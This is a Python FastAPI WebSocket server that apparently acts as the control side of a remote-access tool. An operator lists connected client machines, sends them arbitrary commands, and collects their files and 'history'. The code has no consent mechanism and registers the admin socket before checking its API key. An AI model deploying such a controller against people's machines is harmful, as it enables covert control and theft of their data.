import asyncio

from fastapi import FastAPI, WebSocket
# from fastapi.security import APIKeyHeader
from starlette.middleware.cors import CORSMiddleware
from starlette.websockets import WebSocketDisconnect

from utils import receive_file, is_client_admin

# app
app = FastAPI(
    title='WebSocket Internet Base Monitoring 101',
    version='1.0.0',
    redoc_url='/api/v1/docs'
)

# cors
app.add_middleware(
    CORSMiddleware,
    allow_origins=['*'],
    allow_credentials=True,
    allow_methods=['*'],
    allow_headers=['*'],
)

# Store connected clients
clients = {}  # {client_id: websocket}
admin_websocket = None


async def select_client_to_interact_with(websocket: WebSocket):
    message = "Connected Clients:\n"
    for i, (client_id, client_ws) in enumerate(clients.items()):
        message += f"{i + 1} - {client_ws.client.host}:{client_ws.client.port} (Client ID: {client_id})\n"

    message += "Note! Reply with the number of the client you want to interact with. (zero '0' for Refresh)"
    await websocket.send_text(message)

    data = await websocket.receive_text()
    return data


async def handle_client_interaction(client_websocket: WebSocket, admin_websocket: WebSocket):
    print(f"Connected by {client_websocket.client.host}:{client_websocket.client.port}")

    first_time = True
    try:
        while True:
            if first_time:
                await admin_websocket.send_text(f"activate the status (0,1)")
                await client_websocket.send_text("1")
                first_time = False
                continue

            command = await admin_websocket.receive_text()

            # want to wait until active again
            if command.lower().startswith('switch'):
                await client_websocket.send_text(command)
                return True
            elif command.lower().startswith('download'):
                _, filename = command.split(' ', 1)
                filepath = f"{filename}"
                command = f"download {filepath}"
                await client_websocket.send_text(command)
                continue

            await client_websocket.send_text(command)

    except WebSocketDisconnect:
        print(f"Connection with {client_websocket.client.host} disconnected.")
        return False
    except Exception as e:
        print(f"Exception with {client_websocket.client.host}: {e}")
        return False
    except:
        print("Unexpected message received.")
        return False


@app.websocket("/ws/client")
async def websocket_endpoint_client(websocket: WebSocket):
    await websocket.accept()
    client_id = len(clients) + 1
    clients[client_id] = websocket
    try:
        while True:
            client_data = await websocket.receive_text()

            if client_data.lower().startswith('download'):
                print("receive file")
                _, filename = client_data.split(' ', 1)
                # Use asyncio to concurrently receive file in the background
                response = await asyncio.create_task(receive_file(websocket, filename))
                await admin_websocket.send_text(f"Client {client_id}: {response}")
                continue

            elif client_data.lower().startswith('history'):
                hist = await websocket.receive_json()
                data = {"Client": client_id,
                        "hist": hist}
                await admin_websocket.send_json(data)
                continue

            await admin_websocket.send_text(f"Client {client_id}: {client_data}")
    except:
        del clients[client_id]


@app.websocket("/ws-remote-access/admin")
async def websocket_endpoint(websocket: WebSocket, api_key: str | None):
    global admin_websocket
    admin_websocket = websocket
    await websocket.accept()
    if await is_client_admin(api_key):
        while True:
            data = await select_client_to_interact_with(websocket)
            if int(data) == 0:
                continue
            try:
                selected_index = int(data) - 1
                if 0 <= selected_index < len(clients):
                    selected_client_id = list(clients.keys())[selected_index]
                    client_ws = clients[selected_client_id]
                    await websocket.send_text(
                        f"Interacting with Client {selected_client_id} {client_ws.client.host}:{client_ws.client.port}")

                while await handle_client_interaction(client_ws, websocket):
                    break
            except KeyboardInterrupt:
                print("Server terminated by the user.")
            # except Exception as e:
            #     print("Server Error: ", str(e))